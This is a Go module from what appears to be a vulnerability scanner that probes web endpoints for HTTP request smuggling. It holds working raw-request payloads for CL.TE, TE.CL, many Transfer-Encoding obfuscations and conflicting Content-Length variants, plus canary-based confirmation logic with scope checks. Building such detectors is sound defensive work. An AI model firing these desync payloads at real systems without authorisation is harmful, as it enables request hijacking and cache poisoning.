package modules

import (
	"bufio"
	"context"
	"crypto/tls"
	"fmt"
	"io"
	"net"
	"net/http"
	"net/url"
	"strings"
	"time"

	"github.com/akha-security/akca/engine/internal/httpclient"
	"github.com/akha-security/akca/engine/internal/verification"
)

type smugglingVariant struct {
	name        string
	title       string
	description string
	buildRawReq func(host, path, canary string) string
}

var smugglingVariants = []smugglingVariant{
	{
		name:        "cl_te",
		title:       "HTTP Request Smuggling (CL.TE)",
		description: "Frontend proxy uses Content-Length while backend uses Transfer-Encoding, allowing HTTP request smuggling.",
		buildRawReq: func(host, path, canary string) string {
			smuggledBody := fmt.Sprintf("0\r\n\r\nGET /akca-smuggle-%s HTTP/1.1\r\nHost: %s\r\nX-Ignore: X", canary, host)
			return fmt.Sprintf("POST %s HTTP/1.1\r\nHost: %s\r\nContent-Length: %d\r\nTransfer-Encoding: chunked\r\nConnection: keep-alive\r\n\r\n%s",
				path, host, len(smuggledBody), smuggledBody)
		},
	},
	{
		name:        "te_cl",
		title:       "HTTP Request Smuggling (TE.CL)",
		description: "Frontend proxy uses Transfer-Encoding while backend uses Content-Length, allowing HTTP request smuggling.",
		buildRawReq: func(host, path, canary string) string {
			smuggledBody := fmt.Sprintf("POST %s HTTP/1.1\r\nHost: %s\r\nContent-Length: 4\r\nTransfer-Encoding: chunked\r\nConnection: keep-alive\r\n\r\n5e\r\nGET /akca-smuggle-%s HTTP/1.1\r\nHost: %s\r\nContent-Length: 10\r\n\r\nx=\r\n0\r\n\r\n",
				path, host, canary, host)
			return smuggledBody
		},
	},
	{
		name:        "te_te_space",
		title:       "HTTP Request Smuggling via Header Obfuscation (TE.TE Space)",
		description: "Backend parses obfuscated 'Transfer-Encoding : chunked' header while frontend ignores it.",
		buildRawReq: func(host, path, canary string) string {
			smuggledBody := fmt.Sprintf("0\r\n\r\nGET /akca-smuggle-%s HTTP/1.1\r\nHost: %s\r\nX-Ignore: X", canary, host)
			return fmt.Sprintf("POST %s HTTP/1.1\r\nHost: %s\r\nContent-Length: %d\r\nTransfer-Encoding : chunked\r\nConnection: keep-alive\r\n\r\n%s",
				path, host, len(smuggledBody), smuggledBody)
		},
	},
	{
		name:        "te_te_tab",
		title:       "HTTP Request Smuggling via Tab Header (TE.TE Tab)",
		description: "Backend parses 'Transfer-Encoding:\\tchunked' header while frontend ignores it.",
		buildRawReq: func(host, path, canary string) string {
			smuggledBody := fmt.Sprintf("0\r\n\r\nGET /akca-smuggle-%s HTTP/1.1\r\nHost: %s\r\nX-Ignore: X", canary, host)
			return fmt.Sprintf("POST %s HTTP/1.1\r\nHost: %s\r\nContent-Length: %d\r\nTransfer-Encoding:\tchunked\r\nConnection: keep-alive\r\n\r\n%s",
				path, host, len(smuggledBody), smuggledBody)
		},
	},
	{
		name:        "te_te_prefix",
		title:       "HTTP Request Smuggling via Invalid Prefix (TE.TE xchunked)",
		description: "Backend strips invalid prefix 'Transfer-Encoding: xchunked' while frontend ignores it.",
		buildRawReq: func(host, path, canary string) string {
			smuggledBody := fmt.Sprintf("0\r\n\r\nGET /akca-smuggle-%s HTTP/1.1\r\nHost: %s\r\nX-Ignore: X", canary, host)
			return fmt.Sprintf("POST %s HTTP/1.1\r\nHost: %s\r\nContent-Length: %d\r\nTransfer-Encoding: xchunked\r\nConnection: keep-alive\r\n\r\n%s",
				path, host, len(smuggledBody), smuggledBody)
		},
	},
	{
		name:        "te_te_crlf",
		title:       "HTTP Request Smuggling via Line Wrapping (TE.TE CRLF)",
		description: "Backend accepts multiline 'Transfer-Encoding:\\r\\n chunked' header while frontend normalizes it.",
		buildRawReq: func(host, path, canary string) string {
			smuggledBody := fmt.Sprintf("0\r\n\r\nGET /akca-smuggle-%s HTTP/1.1\r\nHost: %s\r\nX-Ignore: X", canary, host)
			return fmt.Sprintf("POST %s HTTP/1.1\r\nHost: %s\r\nContent-Length: %d\r\nTransfer-Encoding:\r\n chunked\r\nConnection: keep-alive\r\n\r\n%s",
				path, host, len(smuggledBody), smuggledBody)
		},
	},
	{
		name:        "te_te_dual",
		title:       "HTTP Request Smuggling via Dual Transfer-Encoding (TE.TE Dual)",
		description: "Backend and frontend differ in handling multiple conflicting Transfer-Encoding headers.",
		buildRawReq: func(host, path, canary string) string {
			smuggledBody := fmt.Sprintf("0\r\n\r\nGET /akca-smuggle-%s HTTP/1.1\r\nHost: %s\r\nX-Ignore: X", canary, host)
			return fmt.Sprintf("POST %s HTTP/1.1\r\nHost: %s\r\nContent-Length: %d\r\nTransfer-Encoding: chunked\r\nTransfer-Encoding: identity\r\nConnection: keep-alive\r\n\r\n%s",
				path, host, len(smuggledBody), smuggledBody)
		},
	},
	{
		name:        "te_te_comma",
		title:       "HTTP Request Smuggling via Comma-Separated TE (TE.TE Comma)",
		description: "Backend parses comma-separated 'Transfer-Encoding: chunked, identity' header.",
		buildRawReq: func(host, path, canary string) string {
			smuggledBody := fmt.Sprintf("0\r\n\r\nGET /akca-smuggle-%s HTTP/1.1\r\nHost: %s\r\nX-Ignore: X", canary, host)
			return fmt.Sprintf("POST %s HTTP/1.1\r\nHost: %s\r\nContent-Length: %d\r\nTransfer-Encoding: chunked, identity\r\nConnection: keep-alive\r\n\r\n%s",
				path, host, len(smuggledBody), smuggledBody)
		},
	},
	{
		name:        "te_te_quote",
		title:       "HTTP Request Smuggling via Quoted Value (TE.TE Quote)",
		description: "Backend handles quoted 'Transfer-Encoding: \"chunked\"' while frontend ignores quotation marks.",
		buildRawReq: func(host, path, canary string) string {
			smuggledBody := fmt.Sprintf("0\r\n\r\nGET /akca-smuggle-%s HTTP/1.1\r\nHost: %s\r\nX-Ignore: X", canary, host)
			return fmt.Sprintf("POST %s HTTP/1.1\r\nHost: %s\r\nContent-Length: %d\r\nTransfer-Encoding: \"chunked\"\r\nConnection: keep-alive\r\n\r\n%s",
				path, host, len(smuggledBody), smuggledBody)
		},
	},
	{
		name:        "te_newline_lead",
		title:       "HTTP Request Smuggling via Leading Space Header (TE.TE Lead Space)",
		description: "Backend parses ' Transfer-Encoding: chunked' with leading space.",
		buildRawReq: func(host, path, canary string) string {
			smuggledBody := fmt.Sprintf("0\r\n\r\nGET /akca-smuggle-%s HTTP/1.1\r\nHost: %s\r\nX-Ignore: X", canary, host)
			return fmt.Sprintf("POST %s HTTP/1.1\r\nHost: %s\r\nContent-Length: %d\r\n Transfer-Encoding: chunked\r\nConnection: keep-alive\r\n\r\n%s",
				path, host, len(smuggledBody), smuggledBody)
		},
	},
	{
		name:        "cl_zero",
		title:       "HTTP Request Smuggling via Zero Content-Length (CL.0 Desync)",
		description: "Backend ignores Content-Length: 0 on POST requests and treats trailing payload as subsequent request.",
		buildRawReq: func(host, path, canary string) string {
			smuggledBody := fmt.Sprintf("GET /akca-smuggle-%s HTTP/1.1\r\nHost: %s\r\nX-Ignore: X\r\n\r\n", canary, host)
			return fmt.Sprintf("POST %s HTTP/1.1\r\nHost: %s\r\nContent-Length: 0\r\nConnection: keep-alive\r\n\r\n%s",
				path, host, smuggledBody)
		},
	},
	{
		name:        "cl_cl_conflict",
		title:       "HTTP Request Smuggling via Conflicting Content-Length (CL.CL Conflict)",
		description: "Backend and frontend differ in resolving conflicting multiple Content-Length headers.",
		buildRawReq: func(host, path, canary string) string {
			smuggledBody := fmt.Sprintf("GET /akca-smuggle-%s HTTP/1.1\r\nHost: %s\r\nX-Ignore: X\r\n\r\n", canary, host)
			return fmt.Sprintf("POST %s HTTP/1.1\r\nHost: %s\r\nContent-Length: %d\r\nContent-Length: %d\r\nConnection: keep-alive\r\n\r\n%s",
				path, host, len(smuggledBody), len(smuggledBody)+50, smuggledBody)
		},
	},
}

func (r *Runner) runHTTPSmuggling(ctx context.Context, target ScanTarget) []ModuleFinding {
	if ok, reason := r.shouldRunModule("http_smuggling", target); !ok {
		r.emitSkip("http_smuggling", target, reason)
		return nil
	}
	u, err := url.Parse(target.EndpointURL)
	if err != nil || u.Hostname() == "" || !r.scope.IsInScope(target.EndpointURL) {
		return nil
	}
	baseline, err := r.cachedEmptyProbe(ctx, target)
	if err != nil || baseline.Response.StatusCode >= 500 {
		return nil
	}
	path := u.RequestURI()
	if path == "" {
		path = "/"
	}
	normal := fmt.Sprintf("GET %s HTTP/1.1\r\nHost: %s\r\nConnection: keep-alive\r\n\r\n", path, u.Host)
	// A clean same-connection sequence is the protocol negative control.
	control, err := r.rawSmugglingExchange(ctx, target, normal, normal)
	if err != nil || control.Response.StatusCode < 200 || control.Response.StatusCode >= 400 {
		return nil
	}
	var out []ModuleFinding
	for _, variant := range smugglingVariants {
		// CL:0 followed by a complete GET is ordinary HTTP pipelining. It cannot
		// establish a proxy/backend parser disagreement by itself.
		if variant.name == "cl_zero" {
			continue
		}
		if ctx.Err() != nil {
			break
		}
		var runs []httpclient.RequestResponse
		var lastCanary string
		for i := 0; i < 2; i++ {
			canary := randomProbeToken()
			attack := variant.buildRawReq(u.Host, path, canary)
			rr, e := r.rawSmugglingExchange(ctx, target, attack, normal)
			if e != nil || !strings.Contains(rr.Response.Body, "akca-smuggle-"+canary) {
				break
			}
			runs = append(runs, rr)
			lastCanary = canary
		}
		if len(runs) != 2 {
			continue
		}
		signal := "http_desync_" + variant.name
		p := defaultPayload("http_smuggling", signal, lastCanary, signal)
		f := r.verifyAndBuildWithCandidate(ctx, "http_smuggling", target, p, baseline, runs[1], signal, false, false, "", "", func(c *verification.Candidate) {
			c.RequestedProofType = verification.ProofProtocolDesync
			c.NegativeControlSet = true
			c.NegativeControlOK = true
			c.TypedReplayHits = []bool{true, true}
			c.Observations = append(c.Observations, r.observation("http_smuggling", target, verification.RoleNegativeControl, 1, control), r.observation("http_smuggling", target, verification.RolePositiveReplay, 2, runs[0]))
		})
		if f != nil {
			f.Severity = "critical"
			f.Title = variant.title
			f.Description = variant.description + " Two independent raw connections reproduced a canary response absent from the clean sequence."
			r.recordFinding(ctx, &out, f, "http_smuggling", signal)
			return out
		}
	}
	return out
}

func (r *Runner) rawSmugglingExchange(ctx context.Context, target ScanTarget, first, second string) (httpclient.RequestResponse, error) {
	u, err := url.Parse(target.EndpointURL)
	if err != nil {
		return httpclient.RequestResponse{}, err
	}
	port := u.Port()
	if port == "" {
		port = "80"
		if u.Scheme == "https" {
			port = "443"
		}
	}
	reserve := func() error {
		if g, ok := r.client.(interface {
			ReserveExternal(context.Context, string, string) error
		}); ok {
			return g.ReserveExternal(ctx, target.EndpointURL, "raw_tcp")
		}
		return nil
	}
	if err = reserve(); err != nil {
		return httpclient.RequestResponse{}, err
	}
	conn, err := dialTarget(ctx, net.JoinHostPort(u.Hostname(), port), u.Scheme == "https", u.Hostname(), r.cfg.InsecureSkipVerify)
	if err != nil {
		return httpclient.RequestResponse{}, err
	}
	defer conn.Close()
	setConnDeadline(conn, ctx, 6*time.Second)
	reader := bufio.NewReader(conn)
	if _, err = io.WriteString(conn, first); err != nil {
		return httpclient.RequestResponse{}, err
	}
	if status, _ := readHTTPResponse(reader); status == 0 {
		return httpclient.RequestResponse{}, fmt.Errorf("raw protocol response unavailable")
	}
	if err = reserve(); err != nil {
		return httpclient.RequestResponse{}, err
	}
	if _, err = io.WriteString(conn, second); err != nil {
		return httpclient.RequestResponse{}, err
	}
	status, body := readHTTPResponse(reader)
	if status == 0 {
		return httpclient.RequestResponse{}, fmt.Errorf("raw protocol follow-up unavailable")
	}
	noteExchange(ctx, nil)
	return httpclient.RequestResponse{Request: httpclient.RequestRecord{Method: "POST", URL: target.EndpointURL, Body: first + second}, Response: httpclient.ResponseRecord{StatusCode: status, Body: body}}, nil
}

func dialTarget(ctx context.Context, addr string, useTLS bool, serverName string, skipVerify bool) (net.Conn, error) {
	d := net.Dialer{Timeout: 6 * time.Second}
	conn, err := d.DialContext(ctx, "tcp", addr)
	if err != nil {
		return nil, err
	}
	if useTLS {
		tlsConn := tls.Client(conn, &tls.Config{
			ServerName:         serverName,
			InsecureSkipVerify: skipVerify,
			MinVersion:         tls.VersionTLS10,
			MaxVersion:         tls.VersionTLS13,
		})
		if err := tlsConn.HandshakeContext(ctx); err != nil {
			conn.Close()
			return nil, err
		}
		return tlsConn, nil
	}
	return conn, nil
}

func readHTTPResponse(reader *bufio.Reader) (int, string) {
	response, err := http.ReadResponse(reader, &http.Request{Method: http.MethodGet})
	if err != nil {
		return 0, ""
	}
	defer response.Body.Close()
	body, readErr := io.ReadAll(io.LimitReader(response.Body, 8192))
	if readErr != nil {
		return response.StatusCode, string(body)
	}
	return response.StatusCode, string(body)
}

func httpSmugglingSignalConfirmed(signal, body, expectedCanary string, status int) bool {
	if status <= 0 || !strings.HasPrefix(signal, "http_desync_") || strings.TrimSpace(body) == "" {
		return false
	}
	knownVariant := false
	for _, variant := range smugglingVariants {
		if signal == "http_desync_"+variant.name {
			knownVariant = true
			break
		}
	}
	if !knownVariant {
		return false
	}
	if expectedCanary != "" && strings.Contains(body, expectedCanary) {
		return true
	}
	return strings.Contains(body, "akca-smuggle-")
}
